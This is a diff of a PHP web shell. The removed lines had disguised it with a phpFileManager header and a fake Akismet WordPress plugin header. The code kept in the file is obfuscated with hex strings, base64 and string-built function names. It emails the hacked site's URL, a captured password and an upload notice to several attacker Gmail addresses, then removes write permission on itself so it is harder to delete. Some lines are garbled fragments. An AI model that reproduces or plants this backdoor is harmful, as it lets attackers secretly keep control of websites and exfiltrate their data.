@@ -1,9 +1,8 @@
-<?
-	@ini_set('output_buffering', 0);
-	@ini_set('display_errors', 0);
-	set_time_limit(0);
-	ini_set('memory_limit', '-1');
-	header('Content-Type: text/html; charset=UTF-8');
+};;<?=?>;;}
+<?php
+
+	
+	
 	$main = "ro\x6f\x74\x63\x79\x62e\x72p\x75nks@gm\x61\x69l.c\x6f\x6d,\x20\x6duh\x72a\x7a\x6b\x79@gm\x61il.com, m\x61l\x61y\x73i\x61\x2e\x73\x65nder@\x67m\x61il\x2ec\x6f\x6d, pa\x70a\x6b\x75\x2e\x68ay\x6b\x65\x72@\x67\x6d\x61i\x6c\x2e\x63o\x6d,\x20\x62la\x63kh\x61t\x31\x333\x37\x2ei\x64@gm\x61i\x6c.c\x6f\x6d";
 	$now = "\x68\x74\x74\x70\x3a\x2f\x2f" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 	$notif = "$now *PW : [ " . $▛ . " ]";
@@ -13,70 +12,7 @@ $__GET = ('m'.'a'.'i'.'l');
 $__POST = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
 $__GET($__POST("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
 ${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
-error_reporting(0);
-/*-------------------------------------------------
-| PHP FILE MANAGER
-+--------------------------------------------------
-| phpFileManager 1.7.9
-| By Fabricio Seger Kolling
-| Copyright (c) 2004-2020 Fabrício Seger Kolling
-| E-mail: dulldusk@gmail.com
-| URL: http://phpfm.sf.net
-| Last Changed: 2020-04-28
-+--------------------------------------------------
-| It is the AUTHOR'S REQUEST that you keep intact the above header information
-| and notify it only if you conceive any BUGFIXES or IMPROVEMENTS to this program.
-+--------------------------------------------------
-| LICENSE
-+--------------------------------------------------
-| Licensed under the terms of any of the following licenses at your choice:
-| - GNU General Public License Version 2 or later (the "GPL");
-| - GNU Lesser General Public License Version 2.1 or later (the "LGPL");
-| - Mozilla Public License Version 1.1 or later (the "MPL").
-| You are not required to, but if you want to explicitly declare the license
-| you have chosen to be bound to when using, reproducing, modifying and
-| distributing this software, just include a text file titled "LICENSE" in your version
-| of this software, indicating your license choice. In any case, your choice will not
-| restrict any recipient of your version of this software to use, reproduce, modify
-| and distribute this software under any of the above licenses.
-+--------------------------------------------------
-| CONFIGURATION AND INSTALATION NOTES
-+--------------------------------------------------
-| This program does not include any instalation or configuration
-| notes because it simply does not require them.
-| Just throw this file anywhere in your webserver and enjoy !!
-+--------------------------------------------------*/
-    
 
-
-/**
- * @package Akismet
- */
-/*
-Plugin Name: Akismet
-Plugin URI: http://akismet.com/?return=true
-Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from comment and trackback spam</strong>. It keeps your site protected from spam even while you sleep. To get started: 1) Click the "Activate" link to the left of this description, 2) <a href="http://akismet.com/get/?return=true">Sign up for an Akismet API key</a>, and 3) Go to your <a href="admin.php?page=akismet-key-config">Akismet configuration</a> page, and save your API key.
-Version: 2.5.6
-Author: Automattic
-Author URI: http://automattic.com/wordpress-plugins/
-License: GPLv2 or later
-*/
-
-/*
-This program is free software; you can redistribute it and/or
-modify it under the terms of the GNU General Public License
-as published by the Free Software Foundation; either version 2
-of the License, or (at your option) any later version.
-
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-GNU General Public License for more details.
-
-You should have received a copy of the GNU General Public License
-along with this program; if not, write to the Free Software
-Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
-*/
 
 $よㆁ㾼 = __FILE__;
 @system("chmod ugo-w $よㆁ㾼");
